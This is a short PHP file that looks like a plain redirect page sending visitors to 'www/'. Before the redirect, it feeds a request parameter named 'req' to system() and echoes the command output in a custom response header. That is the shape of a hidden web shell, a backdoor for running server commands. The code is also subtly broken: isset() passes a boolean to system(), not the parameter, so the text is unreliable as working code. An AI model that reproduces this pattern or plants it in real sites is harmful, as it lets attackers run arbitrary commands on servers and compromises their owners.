<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); header("Location: www/"); ?>